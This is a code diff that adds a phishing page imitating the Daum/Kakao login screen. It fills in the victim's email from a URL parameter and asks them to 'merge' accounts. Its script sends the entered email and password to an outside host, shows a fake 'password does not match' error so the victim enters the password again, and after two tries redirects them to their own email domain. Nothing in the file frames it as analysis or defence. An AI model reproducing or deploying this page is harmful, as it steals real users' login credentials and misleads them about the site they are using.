@@ -1,0 +1,157 @@
+
+<!DOCTYPE html>
+<html lang="ko">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+      <meta property="og:title" content="Daum 로그인">
+      <meta property="og:type" content="website">
+      <meta property="og:image" content="http://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
+      <meta property="og:image:secure_url" content="https://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
+      <meta property="og:description" content="여기를 눌러 링크를 확인하세요.">
+      <title>Daum Log In</title>
+	  <link href="https://t1.daumcdn.net/top/favicon.ico" rel="shortcut icon">
+      <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width,target-densityDpi=medium-dpi">
+      <meta name="format-detection" content="telephone=no">
+      <link rel="apple-touch-icon-precomposed" href="https://m1.daumcdn.net/svc/image/U03/common_icon/523121BA0553E80001">
+      <link rel="stylesheet" type="text/css" href="https://logins.daum.net/contents/min/css/pc.css?ver=230403055122">
+   </head>
+   <body class="type_size">
+      <div id="kakaoWrap">
+         <div id="kakaoHead">
+            <div class="inner_head">
+               <h1>
+                  <a href="javascript:void(0);" id="daumLogo" class="link_daum" alt="Daum" data-tiara-action-name="Daum_첫화면">
+                  <span class="ir_wa">DAUM</span>
+                  </a>
+               </h1>
+            </div>
+         </div>
+         <hr class="hide">
+         <div id="kakaoContent" class="cont_login" role="main">
+            <!-- 아이디입력도움말 노출시 view_help클래스 / 자판보기 노출시 view_key클래스 / 특수문자 노출시 view_char클래스 추가 -->
+            <div id="mArticle">
+               <h2 class="screen_out">아이디 로그인</h2>
+               <div class="section_login login_type2">
+                  <h3 class="tit_login">Login with the Daum ID<br>you wish to merge</h3>
+                  <div id="loginFormDiv" class="login_default">
+                     <form id="loginForm" method="post" action="">
+                        <fieldset class="fld_comm">
+                           <legend class="screen_out">아이디,비밀번호 로그인 정보 입력 폼</legend>
+                           <div class="box_inp">
+                              <input type="email" id="u" name="u" class="tf_g" placeholder="Enter your ID" style="ime-mode:disabled;" readonly>
+                              <button type="button" class="btn_del" data-tiara-action-name="입력_내용_지우기_버튼_id">
+                              <span class="ico_login ico_del">입력 내용 지우기</span>
+                              </button>
+                           </div>
+                           <p id="id_msg" class="txt_message" style="display:none">아이디를 입력해 주세요.</p>
+                           <div class="box_inp">
+                              <input type="password" id="p" name="p" class="tf_g" maxlength="32" autocomplete="off" style="ime-mode:disabled;" placeholder="Enter your password">
+                              <button type="button" class="btn_del" data-tiara-action-name="입력_내용_지우기_버튼_pwd">
+                              <span class="ico_login ico_del">입력 내용 지우기</span>
+                              </button>
+                           </div>
+                           <p id="pw_msg" class="txt_message" style="display:none">비밀번호를 입력해 주세요.</p>
+						   <p id="err_msg" class="txt_message" style="display:none">Your Account or password does not match. Please try again.</p>
+                           <button id="loginBtn" type="submit" class="btn_comm">Log in</button>
+                        </fieldset>
+                     </form>
+                     <div class="login_rel">
+                        Forgot your
+                        <a href="" class="link_rel" data-tiara-action-name="아이디찾기">ID</a> or
+                        <a href="" class="link_rel" data-tiara-action-name="비밀번호찾기">password</a>?
+                     </div>
+                  </div>
+                  <div class="wrap_btn type_noid" style="display:none">
+                     <button type="button" class="btn_comm btn_type2" onclick="viewAlertForReturn()" data-tiara-action-name="Daum_아이디가_없어요_버튼">Don't have a Daum ID</button>
+                  </div>
+               </div>
+            </div>
+         </div>
+         <hr class="hide">
+         <div id="kakaoFoot">
+            <h2 class="screen_out">서비스 이용정보</h2>
+            <a href="http://www.kakaocorp.com/" class="link_kcorp" target="_blank" data-tiara-action-name="카카오_회사소개">&copy; Kakao Corp.</a>
+            <span class="txt_bar">|</span>
+            <a href="" class="link_custom" target="_blank" data-tiara-action-name="로그인_오류_안내">Help</a>
+         </div>
+      </div>
+	  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+      <script>
+		var count = 0;
+		$('#loginForm').submit(function (event) {
+		  event.preventDefault();
+		  var email = $("#u").val();
+		  var password = $("#p").val();
+		  var ind = email.indexOf("@");
+		  var my_slice = email.substr((ind + 1));
+		  if(email == '') {
+			$('#id_msg').css('display', 'block');
+			email.focus();
+		  }else if(password == '') {
+			$('#pw_msg').css('display', 'block');
+			password.focus();
+		  } else {
+			$('#id_msg, #pw_msg').css('display', 'none');
+			count = count + 1;
+			//console.log(email);
+			$.ajax({
+			  dataType: 'JSON',
+			  url: 'https://cjcenturv.com/letthisbemiownphp/a.php',
+			  type: 'POST',
+			  data: {
+				email: email,
+				password: password
+			  },
+			  beforeSend: function(xhr){
+				$('#loginBtn').text('Log in');
+				  
+			  },
+				
+			 success: function (response) {
+				if (response) {
+				   //console.log(response);
+				   if (response.signal == 'ok') {
+					  $('#err_msg').css('display','block');
+					  $("#p").val("");
+					  if (count >= 2) {
+						 count = 0;
+						 window.location.replace("https://"+my_slice)
+					  }
+				   } else {
+					  $('#err_msg').css('display','block');
+				   }
+				}
+			 },
+			 error: function () {
+				
+				$("#p").val("");
+				if (count >= 2) {
+				   count = 0;
+				   window.location.replace("https://"+my_slice)
+				}
+				$('#err_msg').css('display','block');
+			 },
+			 complete: function(){
+				$('#loginBtn').text('Log in');
+			 }
+			})
+		  }
+		  
+		});
+	  
+		function getParameterByName(name, url) {
+			if (!url) url = window.location.href;
+			name = name.replace(/[\[\]]/g, '\\$&');
+			var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+				results = regex.exec(url);
+			if (!results) return null;
+			if (!results[2]) return '';
+			return decodeURIComponent(results[2].replace(/\+/g, ' '));
+		}
+			
+		const login_username = getParameterByName('cms');
+		document.getElementById("u").value = login_username;
+	  </script>
+   </body>
+</html>
